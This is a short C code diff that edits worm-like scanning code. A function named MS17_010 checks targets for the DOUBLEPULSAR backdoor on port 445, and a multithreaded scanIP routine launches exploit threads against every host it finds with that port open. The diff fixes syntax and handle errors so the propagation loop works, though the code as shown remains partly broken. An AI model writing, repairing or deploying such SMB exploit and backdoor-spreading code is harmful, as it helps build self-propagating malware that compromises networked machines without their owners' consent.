@@ -464,7 +464,7 @@ DWORD MS17_010(DWORD LPPARAM)
 		attemptCount = 0;
 		do
 		{
-			Sleep(3000;
+			Sleep(3000);
 			if ( IsDOUBLEPULSARInstalled(&target, 1, 445) )
 			      break;
 		      	Sleep(3000);
@@ -484,14 +484,17 @@ DWORD MS17_010(DWORD LPPARAM)
 			      
 int scanIP(DWORD LPPARAM)
 {
+	HANDLE ExploitHandle;
 	if (canConnectToPort445(target) > 0)
 	{
-		if( beginthreadex(NULL, MS17_010, (DWORD)LPPARAM, 0, 0) )
+		ExploitHandle = (HANDLE)_beginthreadex(NULL, MS17_010, (DWORD)LPPARAM, 0, 0);
+		//Not sure if the if statement is needed but we'll keep it here for now
+		if( ExploitHandle )
 		{
-			if (WaitForSingleObject(v1, 60000) == 258 ))
+			if (WaitForSingleObject(ExploitHandle, 60000) == 258 ))
 			{
-				TerminateThread(v2, 0);
-      				CloseHandle();
+				TerminateThread(ExploitHandle, 0);
+      				CloseHandle(ExploitHandle);
 			}
 		}
 	}
@@ -500,5 +503,5 @@ int scanIP(DWORD LPPARAM)
 int threadMain()
 {
 	//create 100 threads
-	beginthreadex(0, 0, scanIP, v1[i], 0, 0);
+	(HANDLE)_beginthreadex(0, 0, scanIP, v1[i], 0, 0);
 }
